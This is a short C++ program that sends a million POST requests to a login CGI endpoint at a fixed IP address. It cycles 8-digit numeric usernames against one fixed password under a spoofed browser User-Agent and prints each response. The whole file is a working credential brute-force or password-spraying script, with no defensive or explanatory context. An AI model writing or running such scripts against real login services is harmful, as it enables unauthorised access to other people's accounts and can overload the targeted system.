#include <memory>
#include <map>
#include <cstdio>
#include <fstream>
#include "request.h"
#include "response.h"


int main() {
    std::map<std::string, std::string> headers;
    char *buff = "is_pad=1&username=%08d&password=XXXXXX";
    headers.insert(std::make_pair("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"));
    std::string url = "http://192.0.0.6/cgi-bin/do_login";
    for (int i = 0; i < 1000000; i++) {
        char data[100];
        sprintf(data, buff, i);
        std::shared_ptr<Request> request = std::make_shared<Request>(url, POST, headers, data);
        std::shared_ptr<Response> response = request->get_response();
        printf("%s.\n", data);
        printf("%s\n", response->get_body().c_str());
    }
    return 0;
}